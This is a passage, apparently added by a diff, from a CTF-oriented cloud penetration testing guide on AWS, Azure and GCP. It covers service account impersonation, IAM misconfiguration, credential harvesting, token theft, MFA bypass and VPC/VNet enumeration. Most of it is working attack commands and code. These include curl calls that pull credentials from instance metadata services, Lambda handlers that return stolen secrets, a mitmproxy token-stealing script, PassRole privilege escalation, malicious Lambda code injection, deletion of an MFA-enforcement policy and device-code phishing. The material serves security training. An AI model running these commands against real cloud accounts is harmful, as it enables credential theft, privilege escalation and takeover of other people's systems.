+
+# Export credentials
+export AWS_ACCESS_KEY_ID=<key>
+export AWS_SECRET_ACCESS_KEY=<secret>
+export AWS_SESSION_TOKEN=<token>
+```
+
+**IMDSv2 Token-Based Access:**
+
+```bash
+# Get session token first (required for IMDSv2)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Use token to access metadata
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Get credentials with token
+ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+```
+
+**Lambda Execution Role Extraction:**
+
+```bash
+# From within Lambda function
+# Environment variables contain credentials
+echo $AWS_ACCESS_KEY_ID
+echo $AWS_SECRET_ACCESS_KEY
+echo $AWS_SESSION_TOKEN
+
+# Python code to exfiltrate credentials
+import os
+import json
+
+def lambda_handler(event, context):
+    creds = {
+        'access_key': os.environ['AWS_ACCESS_KEY_ID'],
+        'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
+        'session_token': os.environ['AWS_SESSION_TOKEN']
+    }
+    return {
+        'statusCode': 200,
+        'body': json.dumps(creds)
+    }
+```
+
+**ECS Task Role Credential Theft:**
+
+```bash
+# From within ECS container
+# Get credentials URI from environment
+curl $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+
+# Full request
+curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+```
+
+### Azure Managed Identity Impersonation
+
+**System-Assigned Managed Identity Exploitation:**
+
+```bash
+# From compromised Azure VM
+# Get access token
+TOKEN=$(curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+  | jq -r '.access_token')
+
+# Use token for Azure API calls
+curl -H "Authorization: Bearer $TOKEN" \
+  https://management.azure.com/subscriptions?api-version=2020-01-01
+
+# Get token for different resources
+# Azure Resource Manager
+TOKEN_ARM=$(curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+  | jq -r '.access_token')
+
+# Microsoft Graph
+TOKEN_GRAPH=$(curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
+  | jq -r '.access_token')
+
+# Azure Key Vault
+TOKEN_KV=$(curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
+  | jq -r '.access_token')
+```
+
+**User-Assigned Managed Identity Targeting:**
+
+```bash
+# Specify client_id or object_id for user-assigned identity
+curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<client-id>" \
+  | jq -r '.access_token'
+
+# Or using object_id
+curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&object_id=<object-id>" \
+  | jq -r '.access_token'
+```
+
+**App Service Managed Identity:**
+
+```bash
+# From App Service environment
+# Get endpoint and secret from environment variables
+curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
+  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"
+
+# Extract and use token
+TOKEN=$(curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
+  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/" \
+  | jq -r '.access_token')
+
+curl -H "Authorization: Bearer $TOKEN" \
+  https://management.azure.com/subscriptions?api-version=2020-01-01
+```
+
+**Azure Automation Runbook Identity:**
+
+```PowerShell
+# From Azure Automation runbook
+# Get automation connection
+$connection = Get-AutomationConnection -Name AzureRunAsConnection
+
+# Authenticate
+Connect-AzAccount `
+  -ServicePrincipal `
+  -Tenant $connection.TenantID `
+  -ApplicationId $connection.ApplicationID `
+  -CertificateThumbprint $connection.CertificateThumbprint
+
+# Execute privileged operations
+Get-AzResource
+Get-AzKeyVault
+```
+
+### GCP Service Account Impersonation
+
+**Direct Service Account Impersonation:**
+
+```bash
+# Using generateAccessToken API
+gcloud auth print-access-token \
+  --impersonate-service-account=<sa-email>
+
+# Generate ID token
+gcloud auth print-identity-token \
+  --impersonate-service-account=<sa-email>
+
+# Use impersonation for gcloud commands
+gcloud compute instances list \
+  --impersonate-service-account=<sa-email>
+
+# Use with gsutil
+gsutil -i <sa-email> ls gs://<bucket>
+```
+
+**Service Account Key File Creation:**
+
+```bash
+# Create new key if you have iam.serviceAccountKeys.create
+gcloud iam service-accounts keys create sa-key.json \
+  --iam-account=<sa-email>
+
+# Activate service account
+gcloud auth activate-service-account <sa-email> \
+  --key-file=sa-key.json
+
+# Verify active account
+gcloud auth list
+gcloud config get-value account
+
+# Use for operations
+gcloud projects get-iam-policy <project-id>
+```
+
+**Metadata Server Token Extraction (GCE):**
+
+```bash
+# From compromised GCE instance
+# Get default service account token
+curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Get token for specific service account
+curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/<sa-email>/token
+
+# Get email of attached service account
+curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+
+# Use extracted token
+TOKEN=$(curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
+  | jq -r '.access_token')
+
+curl -H "Authorization: Bearer $TOKEN" \
+  https://cloudresourcemanager.googleapis.com/v1/projects/<project-id>
+```
+
+**Cloud Function Service Account Exploitation:**
+
+```python
+# From within Cloud Function
+import google.auth
+import google.auth.transport.requests
+from google.oauth2 import service_account
+
+def function_handler(request):
+    # Get default credentials (function's service account)
+    credentials, project = google.auth.default()
+    
+    # Request token
+    auth_req = google.auth.transport.requests.Request()
+    credentials.refresh(auth_req)
+    
+    # Return token
+    return {
+        'token': credentials.token,
+        'project': project,
+        'service_account': credentials.service_account_email
+    }
+```
+
+**SignJWT for Custom Token Creation:**
+
+```bash
+# If you have iam.serviceAccounts.signJwt permission
+# Create JWT payload
+cat > payload.json <<EOF
+{
+  "iss": "<sa-email>",
+  "sub": "<sa-email>",
+  "aud": "https://oauth2.googleapis.com/token",
+  "iat": $(date +%s),
+  "exp": $(($(date +%s) + 3600))
+}
+EOF
+
+# Sign JWT using GCP API
+curl -X POST \
+  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
+  -H "Content-Type: application/json" \
+  -d "@payload.json" \
+  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<sa-email>:signJwt"
+
+# Exchange JWT for access token
+curl -X POST \
+  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+  -d "assertion=<signed-jwt>" \
+  https://oauth2.googleapis.com/token
+```
+
+**Workload Identity Exploitation (GKE):**
+
+```bash
+# From GKE pod with workload identity
+# Service account token automatically mounted
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# Get GCP token via metadata server
+curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Kubernetes service account mapped to GCP service account
+# Uses format: <k8s-sa-name>@<project-id>.iam.gserviceaccount.com
+```
+
+**Service Account Impersonation Chaining:**
+
+```bash
+# Chain through multiple service accounts
+# SA1 has actAs on SA2, SA2 has actAs on SA3, etc.
+
+# Step 1: Impersonate SA2 using SA1
+gcloud auth print-access-token \
+  --impersonate-service-account=sa2@project.iam.gserviceaccount.com
+
+# Step 2: Use SA2 token to impersonate SA3
+# Set token as default credential
+export CLOUDSDK_AUTH_ACCESS_TOKEN=<sa2-token>
+
+gcloud auth print-access-token \
+  --impersonate-service-account=sa3@project.iam.gserviceaccount.com
+
+# Continue chain as needed
+```
+
+**Critical Permissions for Service Account Impersonation:**
+
+AWS:
+
+- `iam:PassRole` - Pass role to service
+- `sts:AssumeRole` - Assume role directly
+- `ec2:RunInstances` - Launch instance with role
+- `lambda:CreateFunction` - Create Lambda with execution role
+
+Azure:
+
+- `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action` - Assign managed identity
+- `Microsoft.Authorization/roleAssignments/write` - Create role assignments
+- `Microsoft.Compute/virtualMachines/write` - Create VM with identity
+
+GCP:
+
+- `iam.serviceAccounts.actAs` - Impersonate service account
+- `iam.serviceAccountKeys.create` - Create SA keys
+- `iam.serviceAccounts.signJwt` - Sign JWTs as SA
+- `iam.serviceAccounts.getAccessToken` - Generate access tokens
+- `iam.serviceAccounts.implicitDelegation` - Implicit delegation
+
+---
+
+**Related Critical Topics:** Credential harvesting from compute resources, SSRF to metadata services, container escape to host service accounts, Kubernetes RBAC exploitation for cloud identity access.
+
+---
+
+## Policy Misconfiguration
+
+### Understanding IAM Policy Structure
+
+IAM policies define permissions through JSON documents with explicit Allow/Deny statements. Misconfigurations occur when policies grant excessive permissions through overly broad principals, actions, or resources.
+
+**Core Policy Elements:**
+
+- **Principal**: Who can access (users, roles, services)
+- **Action**: What operations are permitted
+- **Resource**: Which resources the actions apply to
+- **Condition**: Optional constraints on when permissions apply
+
+### Common Misconfiguration Patterns
+
+**Wildcard Abuse:**
+
+```json
+{
+  "Effect": "Allow",
+  "Action": "*",
+  "Resource": "*"
+}
+```
+
+This grants full administrative access. Search for policies containing `"Action": "*"` or `"Resource": "*"`.
+
+**Overly Permissive Resource Specifications:**
+
+```json
+{
+  "Effect": "Allow",
+  "Action": "s3:GetObject",
+  "Resource": "arn:aws:s3:::*/*"
+}
+```
+
+Grants read access to all S3 buckets instead of specific ones.
+
+**PassRole Exploitation:** The `iam:PassRole` permission allows attaching IAM roles to services. When combined with service-specific permissions, this enables privilege escalation:
+
+```bash
+# Enumerate your current permissions
+aws iam get-user
+aws iam list-attached-user-policies --user-name <username>
+aws iam get-policy-version --policy-arn <arn> --version-id <version>
+
+# Check for PassRole permission
+# Look for "iam:PassRole" in policy documents
+
+# If found, enumerate available roles
+aws iam list-roles
+
+# Pass high-privilege role to exploitable service
+aws lambda create-function --function-name exploit \
+  --runtime python3.9 \
+  --role arn:aws:iam::ACCOUNT_ID:role/HighPrivRole \
+  --handler lambda_function.lambda_handler \
+  --zip-file fileb://payload.zip
+```
+
+**AssumeRole Misconfigurations:** Trust policies that allow assumption from overly broad principals:
+
+```json
+{
+  "Effect": "Allow",
+  "Principal": {"AWS": "*"},
+  "Action": "sts:AssumeRole"
+}
+```
+
+Enumerate assumable roles:
+
+```bash
+# List roles
+aws iam list-roles
+
+# Examine trust policy
+aws iam get-role --role-name <RoleName>
+
+# Attempt assumption
+aws sts assume-role --role-arn <arn> --role-session-name exploit
+
+# Use temporary credentials
+export AWS_ACCESS_KEY_ID=<from assume-role output>
+export AWS_SECRET_ACCESS_KEY=<from assume-role output>
+export AWS_SESSION_TOKEN=<from assume-role output>
+```
+
+### Enumeration Techniques
+
+**AWS Enumeration:**
+
+```bash
+# Identify current identity
+aws sts get-caller-identity
+
+# List accessible resources
+aws s3 ls
+aws ec2 describe-instances
+aws lambda list-functions
+aws iam list-users
+aws iam list-roles
+
+# Enumerate policies for discovered principals
+aws iam list-user-policies --user-name <username>
+aws iam list-role-policies --role-name <rolename>
+aws iam list-attached-user-policies --user-name <username>
+aws iam get-policy --policy-arn <arn>
+```
+
+**Azure Enumeration:**
+
+```bash
+# Authenticate
+az login
+
+# Get current context
+az account show
+
+# List role assignments
+az role assignment list --assignee <object-id>
+az role assignment list --all
+
+# Enumerate service principals
+az ad sp list --all
+
+# Check specific resource permissions
+az resource list
+az role assignment list --scope <resource-id>
+```
+
+**GCP Enumeration:**
+
+```bash
+# Authenticate
+gcloud auth login
+
+# Get current account
+gcloud config list
+
+# List IAM policies
+gcloud projects get-iam-policy <project-id>
+
+# Service account enumeration
+gcloud iam service-accounts list
+gcloud iam service-accounts get-iam-policy <sa-email>
+
+# Check permissions
+gcloud projects get-iam-policy <project-id> \
+  --flatten="bindings[].members" \
+  --filter="bindings.members:<account>"
+```
+
+### Automated Policy Analysis Tools
+
+**ScoutSuite** (multi-cloud security auditing):
+
+```bash
+pip3 install scoutsuite
+
+# AWS scan
+scout aws --profile <profile-name>
+
+# Azure scan
+scout azure --cli
+
+# GCP scan
+scout gcp --project-id <project-id>
+
+# Results in HTML report: scoutsuite-report/scoutsuite_results_*.html
+```
+
+**Prowler** (AWS-focused):
+
+```bash
+git clone https://github.com/prowler-cloud/prowler
+cd prowler
+
+# Full scan
+./prowler -M csv html
+
+# Scan specific checks
+./prowler -c check310  # IAM policies attached to users
+./prowler -c check311  # IAM policies allow full administrative privileges
+```
+
+**PMapper** (AWS IAM privilege mapping):
+
+```bash
+pip3 install principalmapper
+
+# Build graph of IAM relationships
+pmapper graph create
+
+# Query privilege escalation paths
+pmapper query "who can do s3:GetObject on *"
+pmapper escalation --principal <username>
+```
+
+## Credential Harvesting
+
+### Instance Metadata Service (IMDS) Exploitation
+
+**AWS IMDS v1 (vulnerable to SSRF):**
+
+```bash
+# From compromised instance or SSRF vulnerability
+curl http://169.254.169.254/latest/meta-data/
+
+# Enumerate IAM role
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Retrieve temporary credentials
+ROLE=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+
+# Output contains AccessKeyId, SecretAccessKey, Token
+```
+
+**AWS IMDS v2 (requires token):**
+
+```bash
+# Request token
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Use token for requests
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+```
+
+**Azure IMDS:**
+
+```bash
+# Retrieve access token
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
+  -H Metadata:true
+
+# Use token in API requests
+curl -H "Authorization: Bearer <token>" \
+  https://management.azure.com/subscriptions?api-version=2020-01-01
+```
+
+**GCP Metadata:**
+
+```bash
+# Get access token
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+  -H "Metadata-Flavor: Google"
+
+# Get service account email
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
+  -H "Metadata-Flavor: Google"
+
+# List scopes
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
+  -H "Metadata-Flavor: Google"
+```
+
+### User Data and Environment Variables
+
+**Check user-data scripts:**
+
+```bash
+# AWS - from instance
+curl http://169.254.169.254/latest/user-data
+
+# Common locations for credentials in user-data
+# - Hardcoded AWS keys
+# - Database connection strings
+# - API tokens
+```
+
+**Environment variable harvesting:**
+
+```bash
+# Linux
+env | grep -i 'key\|secret\|token\|password\|aws\|azure\|gcp'
+cat /proc/*/environ | strings | grep -i 'key\|secret'
+
+# Search shell history
+cat ~/.bash_history | grep -i 'aws\|export\|key'
+cat ~/.aws/config
+cat ~/.aws/credentials
+
+# Check running processes
+ps auxe | grep -i 'key\|secret\|token'
+```
+
+### Storage Enumeration
+
+**AWS S3 bucket reconnaissance:**
+
+```bash
+# List buckets
+aws s3 ls
+
+# List bucket contents recursively
+aws s3 ls s3://bucket-name --recursive
+
+# Download entire bucket
+aws s3 sync s3://bucket-name ./local-dir/
+
+# Common credential-containing files:
+# - .aws/credentials
+# - .env
+# - config.json
+# - secrets.yaml
+# - *.pem, *.key
+```
+
+**Search downloaded content:**
+
+```bash
+# Grep for credential patterns
+grep -r "AKIA[0-9A-Z]{16}" ./  # AWS access keys
+grep -r "BEGIN RSA PRIVATE KEY" ./
+grep -r "password\|passwd\|pwd" . --include="*.json" --include="*.yaml" --include="*.conf"
+
+# Use truffleHog for secrets detection
+trufflehog filesystem ./local-dir/ --json
+```
+
+### Application Configuration Files
+
+**Common credential locations:**
+
+```bash
+# Web applications
+/var/www/html/config.php
+/var/www/html/.env
+/opt/app/application.properties
+
+# Containers
+docker inspect <container-id>  # Check environment variables
+docker logs <container-id> | grep -i key
+
+# Kubernetes secrets (if you have kubectl access)
+kubectl get secrets -A
+kubectl get secret <secret-name> -o yaml
+echo "<base64-data>" | base64 -d
+```
+
+### Git Repository Exposure
+
+**Search commit history:**
+
+```bash
+# Clone repository
+git clone <repo-url>
+
+# Search all commits for credentials
+git log -p | grep -i "password\|key\|secret"
+
+# Use git-secrets scanner
+git secrets --scan-history
+
+# Use truffleHog
+trufflehog git <repo-url> --only-verified
+```
+
+## Token Theft and Reuse
+
+### AWS Security Token Service (STS) Tokens
+
+**Token structure:** AWS temporary credentials consist of:
+
+- `AccessKeyId`: Begins with `ASIA` (vs permanent keys: `AKIA`)
+- `SecretAccessKey`: 40-character string
+- `SessionToken`: Long base64-encoded string
+
+**Token theft from compromised instance:**
+
+```bash
+# Extract from IMDS (shown in credential harvesting)
+# Or from environment variables
+echo $AWS_ACCESS_KEY_ID
+echo $AWS_SECRET_ACCESS_KEY
+echo $AWS_SESSION_TOKEN
+
+# Export on attacker machine
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+
+# Verify access
+aws sts get-caller-identity
+```
+
+**Token lifetime and renewal:**
+
+```bash
+# Check token expiration
+aws sts get-session-token
+
+# Tokens typically valid 1-12 hours
+# [Inference] If the role's trust policy permits, you may be able to request new tokens before expiration by re-assuming the role, but this depends on having continued access to the assuming principal
+```
+
+### Azure Access Tokens
+
+**Token types:**
+
+- **Access tokens**: JWT format, used for API authentication
+- **Refresh tokens**: Used to obtain new access tokens
+
+**Extract tokens from Azure CLI:**
+
+```bash
+# Tokens stored in ~/.azure/
+cat ~/.azure/accessTokens.json
+cat ~/.azure/azureProfile.json
+
+# Get current token
+az account get-access-token
+
+# Use token with REST API
+curl -H "Authorization: Bearer <token>" \
+  https://management.azure.com/subscriptions?api-version=2020-01-01
+```
+
+**Token analysis:**
+
+```bash
+# Decode JWT (does not verify signature)
+echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | jq
+
+# Check expiration (exp claim)
+# Check scope (scp claim)
+# Check audience (aud claim)
+```
+
+**Token refresh:**
+
+```bash
+# [Unverified] - Azure refresh token mechanism
+# If you capture a refresh token, you may be able to request new access tokens
+# This depends on the refresh token not being revoked and remaining within its lifetime
+
+# Using Azure AD authentication library
+# Implementation varies by library and authentication flow
+```
+
+### GCP Access Tokens
+
+**Extract from gcloud:**
+
+```bash
+# Get access token
+gcloud auth print-access-token
+
+# Get token with specific scopes
+gcloud auth application-default print-access-token
+
+# Configuration location
+cat ~/.config/gcloud/credentials.db  # SQLite database
+cat ~/.config/gcloud/access_tokens.db
+```
+
+**Use stolen tokens:**
+
+```bash
+# Set token for gcloud
+gcloud config set auth/access_token_file <token-file>
+
+# Or use directly with curl
+curl -H "Authorization: Bearer <token>" \
+  https://cloudresourcemanager.googleapis.com/v1/projects
+```
+
+### Session Token Extraction from Web Applications
+
+**Browser storage inspection:**
+
+```javascript
+// In browser console
+console.log(localStorage)
+console.log(sessionStorage)
+console.log(document.cookie)
+
+// Look for JWT tokens in:
+// - Authorization headers in network tab
+// - Local/session storage keys like "token", "auth", "session"
+// - Cookies with names containing "session", "auth", "token"
+```
+
+**Intercept with proxy:**
+
+```bash
+# Configure Burp Suite or mitmproxy
+# Intercept API requests
+# Extract Authorization headers or session tokens
+
+# Example mitmproxy filter
+mitmdump -s token_stealer.py
+
+# token_stealer.py
+def response(flow):
+    if "Authorization" in flow.request.headers:
+        print(flow.request.headers["Authorization"])
+```
+
+### Credential Exfiltration via Compromised Lambda/Functions
+
+**AWS Lambda environment:**
+
+```python
+import os
+import boto3
+
+# Lambda functions execute with IAM role credentials
+# These are available via environment variables
+
+def lambda_handler(event, context):
+    # Credentials automatically available to boto3
+    sts = boto3.client('sts')
+    identity = sts.get_caller_identity()
+    
+    # Exfiltrate via various methods:
+    # - HTTP callback to attacker server
+    # - S3 upload to public bucket
+    # - CloudWatch Logs (if you have access to read them)
+    
+    return identity
+```
+
+**Inject malicious code:**
+
+```bash
+# If you can update function code
+zip payload.zip lambda_function.py
+
+aws lambda update-function-code \
+  --function-name <function-name> \
+  --zip-file fileb://payload.zip
+
+# Invoke function
+aws lambda invoke --function-name <function-name> output.txt
+cat output.txt
+```
+
+## MFA Bypass Techniques
+
+### Important Context
+
+[Unverified] The specific effectiveness of MFA bypass techniques varies significantly based on implementation details, security controls, and organizational policies. The techniques below describe known attack patterns, but success depends on specific configurations.
+
+### Credential Stuffing Against Non-MFA Endpoints
+
+**Concept:** Some AWS/Azure/GCP services or API endpoints may not enforce MFA even when it's enabled for console access.
+
+**AWS console vs programmatic access:**
+
+```bash
+# MFA may be required for console login
+# But not enforced for API access with access keys
+
+# If you obtain access keys (not tied to MFA)
+export AWS_ACCESS_KEY_ID=AKIA...
+export AWS_SECRET_ACCESS_KEY=...
+
+aws s3 ls  # May work even if console requires MFA
+```
+
+**Test programmatic access:**
+
+```bash
+# AWS
+aws sts get-caller-identity
+
+# Azure
+az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>
+
+# GCP
+gcloud auth activate-service-account --key-file=<json-key>
+```
+
+### Session Token Reuse
+
+**Obtain authenticated session before MFA prompt:** [Inference] If an application issues a session token before requiring MFA for certain actions, that token might be reusable for other operations.
+
+```bash
+# Capture session cookie/token during initial authentication
+# Before MFA challenge appears
+
+# Test if token works for privileged operations
+# Example: API endpoints, administrative functions
+
+curl -H "Cookie: session=<captured-token>" \
+  https://app.example.com/admin/users
+```
+
+### Exploiting MFA Enrollment Process
+
+**Incomplete enrollment:** [Inference] If MFA enrollment is optional or has a grace period, accounts may be accessible without MFA.
+
+```bash
+# Enumerate users
+aws iam list-users
+
+# Check MFA status
+aws iam list-mfa-devices --user-name <username>
+
+# Empty response indicates no MFA enrolled
+```
+
+**Self-service enrollment exploitation:**
+
+```bash
+# If you compromise credentials during enrollment period
+# Before MFA is enforced
+
+# Check if you can disable MFA requirement
+aws iam delete-user-policy --user-name <username> --policy-name EnforceMFA
+
+# Or if you can modify account settings via API
+```
+
+### Pass-the-Token Attacks
+
+**STS AssumeRole without MFA:**
+
+```bash
+# Some roles may not require MFA in their trust policy
+# Even if the assuming principal has MFA enabled
+
+# Check role trust policy
+aws iam get-role --role-name <RoleName>
+
+# Look for absence of MFA condition:
+# "Condition": {
+#   "Bool": { "aws:MultiFactorAuthPresent": "true" }
+# }
+
+# If no MFA condition, assume role without MFA
+aws sts assume-role \
+  --role-arn arn:aws:iam::ACCOUNT:role/RoleName \
+  --role-session-name exploit
+```
+
+### Azure Conditional Access Bypass
+
+**Trusted location bypass:** [Inference] Azure Conditional Access policies may exempt certain IP ranges or locations from MFA requirements.
+
+```bash
+# If policies check for:
+# - Corporate VPN IP ranges
+# - Specific geographic locations
+# - Compliant device status
+
+# Attempt access from different locations/IPs
+# Test with various User-Agent strings to simulate compliant devices
+```
+
+**Legacy authentication protocols:** [Unverified] Some legacy protocols (IMAP, POP3, SMTP) may not support modern authentication and could bypass MFA.
+
+```bash
+# Test legacy protocol access
+# Example: SMTP AUTH
+curl --url 'smtp://smtp.office365.com:587' \
+  --mail-from 'user@domain.com' \
+  --mail-rcpt 'target@domain.com' \
+  --user 'user@domain.com:password'
+```
+
+### Session Persistence Exploitation
+
+**Long-lived session tokens:** [Inference] Applications may issue long-lived tokens after MFA verification that remain valid even if MFA is subsequently disabled.
+
+```bash
+# Authenticate with MFA
+# Capture session token
+# Wait or trigger MFA disable/reset
+# Attempt to use old session token
+
+# Testing approach varies by platform
+```
+
+### OAuth Token Theft
+
+**Device code phishing:** [Inference] Device code flow allows authentication on a separate device, which can be exploited via social engineering.
+
+```bash
+# Initiate device code flow
+az login --use-device-code
+
+# Output provides URL and code
+# Social engineering: trick user to enter code at URL
+
+# Attacker gains access without directly handling password/MFA
+```
+
+### Proxy Token from Trusted Service
+
+**Service principals and managed identities:**
+
+```bash
+# Azure Managed Identity doesn't require MFA
+# If you compromise a resource with managed identity
+
+curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
+  -H Metadata:true
+
+# This bypasses user MFA requirements
+```
+
+**AWS IAM roles for EC2:**
+
+```bash
+# EC2 instance profiles bypass MFA
+# Compromise instance -> get role credentials -> no MFA needed
+
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+### Important MFA Bypass Notes
+
+[Unverified] Effectiveness of bypass techniques depends heavily on:
+
+- Specific implementation of MFA enforcement
+- Conditional access policies
+- Service vs. user authentication differences
+- Legacy protocol support status
+- Session management configurations
+
+**Detection risk:** MFA bypass attempts may generate security alerts including:
+
+- Unusual login locations
+- Legacy protocol usage
+- Failed MFA challenges
+- Concurrent sessions from different locations
+
+**Defensive recommendations relevant to CTF:**
+
+- Check for inconsistent MFA enforcement across APIs
+- Identify legacy authentication methods still enabled
+- Review service principal and managed identity permissions
+- Examine session token lifetime policies
+
+---
+
+# Cloud Network Penetration
+
+## VPC/VNet Enumeration
+
+### AWS VPC Enumeration
+
+**Primary Tools:**
+
+- `aws-cli` - Official AWS command-line interface
+- `ScoutSuite` - Multi-cloud security auditing tool
+- `Prowler` - AWS security assessment tool
+- `Pacu` - AWS exploitation framework
+
+**Core Enumeration Commands:**
+
+```bash
+# List all VPCs in current region
+aws ec2 describe-vpcs
+
+# Get VPC details with CIDR blocks
+aws ec2 describe-vpcs --vpc-ids vpc-xxxxx --query 'Vpcs[*].[VpcId,CidrBlock,IsDefault]'
+
+# Enumerate subnets in a VPC
+aws ec2 describe-subnets --filters "Name=vpc-id,Values=vpc-xxxxx"
+
+# List route tables and associations
+aws ec2 describe-route-tables --filters "Name=vpc-id,Values=vpc-xxxxx"
+
+# Discover internet gateways
+aws ec2 describe-internet-gateways --filters "Name=attachment.vpc-id,Values=vpc-xxxxx"
+
+# Find NAT gateways
+aws ec2 describe-nat-gateways --filter "Name=vpc-id,Values=vpc-xxxxx"
+
+# Enumerate VPC peering connections
+aws ec2 describe-vpc-peering-connections
+
+# List VPC endpoints (for AWS services)
+aws ec2 describe-vpc-endpoints --filters "Name=vpc-id,Values=vpc-xxxxx"
+
+# Enumerate network interfaces
+aws ec2 describe-network-interfaces --filters "Name=vpc-id,Values=vpc-xxxxx"
+```
+
+**Advanced Enumeration Techniques:**
+
+```bash
+# Identify public vs private subnets (public have routes to IGW)
+aws ec2 describe-route-tables --query 'RouteTables[*].[RouteTableId,Routes[?GatewayId!=`local`].GatewayId]'
+
+# Find all available CIDR ranges
+aws ec2 get-associated-ipv6-pool-cidrs --pool-id pool-xxxxx
+
+# Enumerate VPC flow logs status
+aws ec2 describe-flow-logs --filter "Name=resource-id,Values=vpc-xxxxx"
+
+# Check DNS settings
+aws ec2 describe-vpc-attribute --vpc-id vpc-xxxxx --attribute enableDnsHostnames
+aws ec2 describe-vpc-attribute --vpc-id vpc-xxxxx --attribute enableDnsSupport
+```
+
+**Using ScoutSuite for Automated VPC Enumeration:**
+
+```bash
+# Install ScoutSuite
+pip3 install scoutsuite
+
+# Run full AWS audit (includes VPC analysis)
+scout aws --profile <profile_name> --report-dir ./scout-report
+
+# Results include:
+# - VPC configuration issues
+# - Subnet exposure analysis
+# - Flow log configuration
+# - Network ACL and security group findings
+```
+
+**Using Pacu for Offensive VPC Enumeration:**
+
+```bash
+# Start Pacu
+pacu
+
+# Set AWS keys
+set_keys
+
+# Run VPC enumeration module
+run ec2__enum
+
+# Specific VPC data gathering
+run vpc__enum_lateral_movement
+```
+
+### Azure VNet Enumeration
+
+**Primary Tools:**
+
+- `az-cli` - Azure command-line interface
+- `PowerShell with Az module`
+- `ScoutSuite` - Works for Azure
+- `MicroBurst` - Azure security assessment scripts
+
+**Core Enumeration Commands:**
+
+```bash
+# List all virtual networks
+az network vnet list --output table
+
+# Get specific VNet details
+az network vnet show --resource-group <rg_name> --name <vnet_name>
+
+# List subnets in a VNet
+az network vnet subnet list --resource-group <rg_name> --vnet-name <vnet_name> --output table
+
+# Enumerate network security groups
+az network nsg list --output table
+
+# Check NSG rules
+az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> --output table
+
+# List route tables
+az network route-table list --output table
+
+# Enumerate VNet peerings
+az network vnet peering list --resource-group <rg_name> --vnet-name <vnet_name>
+
+# List network interfaces
+az network nic list --output table
+
+# Check network watcher status
+az network watcher list
+```
+
+**PowerShell Enumeration:**
+
+```powershell
+# Connect to Azure
+Connect-AzAccount
+
+# Get all VNets
+Get-AzVirtualNetwork
+
+# Detailed VNet information
+Get-AzVirtualNetwork -ResourceGroupName <rg_name> -Name <vnet_name> | Select-Object *
+
+# Enumerate subnets with details
+Get-AzVirtualNetworkSubnetConfig -VirtualNetwork (Get-AzVirtualNetwork -Name <vnet_name>)
+
+# Get NSGs with rules
+Get-AzNetworkSecurityGroup | Select-Object Name, ResourceGroupName, Location
